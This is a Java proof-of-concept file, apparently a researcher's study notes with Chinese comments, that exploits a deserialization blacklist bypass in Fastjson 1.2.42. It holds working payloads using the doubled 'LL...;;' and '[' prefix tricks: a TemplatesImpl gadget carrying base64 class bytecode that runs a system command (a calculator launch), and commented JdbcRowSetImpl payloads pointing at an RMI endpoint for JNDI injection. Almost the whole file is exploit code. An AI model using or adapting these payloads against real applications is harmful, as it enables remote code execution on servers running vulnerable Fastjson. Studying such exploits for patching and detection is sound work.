package Fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/12 14:22
 */
public class Fastjson1242 {
    public static void main(String[] args) {
        /*
        Fastjson1.2.42主要是针对L;进行的修复，将黑名单进行了hash化，监测到如果以L开头的payload，就去除首尾，因此可以双写绕过
        [依旧可以绕过，L;的话通过双写也可以绕过
         */


        /*
        TemplatesImpl链子
         */
        //这是使用的[进行绕过，需要在@type前加[，在@type结束后立刻加[，在,"_bytecodes前部加上[,{，变成[,{"_bytecodes
        String payload = "{\"@type\":\"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[,{\"_bytecodes\":[\"yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUNhbGMuamF2YQwACQAKBwAhDAAiACMBABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABtTZXJpYWxpemF0aW9uL0Zhc3Rqc29uL0NhbGMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAABAAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABwADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAhAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABMACQAWAAwAFAANABUAEQAXABMAAAAHAAJMBwAUBAABABUAAAACABY=\n\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\"}";

        //这是使用的L;进行绕过
//        String payload = "{\"@type\":\"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\",\"_bytecodes\":[\"yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUNhbGMuamF2YQwACQAKBwAhDAAiACMBABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABtTZXJpYWxpemF0aW9uL0Zhc3Rqc29uL0NhbGMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAABAAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABwADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAhAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABMACQAWAAwAFAANABUAEQAXABMAAAAHAAJMBwAUBAABABUAAAACABY=\n\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\"}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload, Feature.SupportNonPublicField);


        /*
        JdbcRowSetImpl链子
         */
        //这是使用的L;进行绕过
//        String payload2 = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";

        //使用[进行绕过，与TemplatesImpl链子一样
//        String payload2 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        JSON.parse(payload2);
    }
}
